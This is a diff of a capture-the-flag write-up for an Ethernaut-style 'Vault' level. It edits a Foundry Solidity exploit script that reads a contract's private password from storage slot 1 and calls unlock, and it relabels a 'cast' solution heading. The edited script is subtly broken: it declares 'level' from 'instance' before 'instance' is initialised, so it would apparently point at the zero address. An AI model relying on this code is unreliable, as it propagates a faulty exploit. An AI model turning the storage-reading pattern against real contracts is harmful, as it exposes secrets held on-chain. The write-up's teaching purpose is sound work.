@@ -218,16 +218,16 @@ contract VaultTest is Test {
 ```solidity
 contract Exploit is Script {
 
+        Vault level = Vault(instance); 
         address instance = vm.envAddress("INSTANCE_LEVEL8");
-        Vault level = Vault(instance);        
-        
+        uint256 hacker = vm.envUint("PRIVATE_KEY");   
+        address deployer = vm.rememberKey(hacker);   
+               
         function run() external {
 
-            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-            
+            vm.startBroadcast(deployer);
             bytes32 password = vm.load(instance, bytes32(uint256(1)));
             level.unlock(password);
-            
             vm.stopBroadcast();
     }
 }
@@ -248,7 +248,7 @@ contract Exploit is Script {
 
 ---
 
-### solution using `cast`
+### alternative solution using `cast`
 
 <br>
 
